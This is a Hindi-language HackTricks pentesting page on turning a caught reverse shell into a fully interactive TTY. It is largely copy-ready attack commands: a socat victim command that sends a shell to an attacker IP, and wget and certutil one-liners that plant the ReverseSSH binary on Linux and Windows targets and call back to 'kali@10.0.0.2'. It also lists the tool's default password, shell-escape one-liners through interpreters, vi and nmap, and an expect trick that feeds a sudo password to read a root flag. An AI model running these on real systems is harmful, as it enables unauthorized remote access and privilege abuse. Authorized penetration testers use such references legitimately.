# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

ध्यान दें कि `SHELL` वेरिएबल में सेट किया गया शेल **ज़रूर** _**/etc/shells**_ के अंदर **सूचीबद्ध** होना चाहिए या `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`। इसके अलावा, ध्यान दें कि अगले स्निप्पेट केवल bash में काम करते हैं। यदि आप zsh में हैं, तो शेल प्राप्त करने से पहले `bash` चलाकर bash में बदलें।

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!NOTE]
> आप **`stty -a`** चलाकर **पंक्तियों** और **स्तंभों** की **संख्या** प्राप्त कर सकते हैं।

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **शेल उत्पन्न करें**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

**इंटरएक्टिव शेल एक्सेस**, साथ ही **फाइल ट्रांसफर** और **पोर्ट फॉरवर्डिंग** के लिए एक सुविधाजनक तरीका है लक्षित पर स्थिर-लिंक्ड ssh सर्वर [ReverseSSH](https://github.com/Fahrj/reverse-ssh) को डालना।

नीचे `x86` के लिए एक उदाहरण है जिसमें upx-संपीड़ित बाइनरी हैं। अन्य बाइनरी के लिए, [रिलीज़ पृष्ठ](https://github.com/Fahrj/reverse-ssh/releases/latest/) देखें।

1. ssh पोर्ट फॉरवर्डिंग अनुरोध को पकड़ने के लिए स्थानीय रूप से तैयार करें:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) लिनक्स लक्ष्य:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows 10 लक्ष्य (पुरानी संस्करणों के लिए, [प्रोजेक्ट रीडमी](https://github.com/Fahrj/reverse-ssh#features) देखें):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- यदि ReverseSSH पोर्ट फॉरवर्डिंग अनुरोध सफल रहा, तो आप अब उपयोगकर्ता के संदर्भ में डिफ़ॉल्ट पासवर्ड `letmeinbrudipls` के साथ लॉग इन करने में सक्षम होना चाहिए जो `reverse-ssh(.exe)` चला रहा है:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) स्वचालित रूप से Linux रिवर्स शेल को TTY में अपग्रेड करता है, टर्मिनल के आकार को संभालता है, सब कुछ लॉग करता है और बहुत कुछ। यह Windows शेल के लिए readline समर्थन भी प्रदान करता है।

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

यदि किसी कारणवश आप पूर्ण TTY प्राप्त नहीं कर सकते हैं, तो आप **फिर भी उन कार्यक्रमों के साथ इंटरैक्ट कर सकते हैं** जो उपयोगकर्ता इनपुट की अपेक्षा करते हैं। निम्नलिखित उदाहरण में, पासवर्ड को `sudo` के माध्यम से एक फ़ाइल पढ़ने के लिए पास किया जाता है:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
{{#include ../../banners/hacktricks-training.md}}
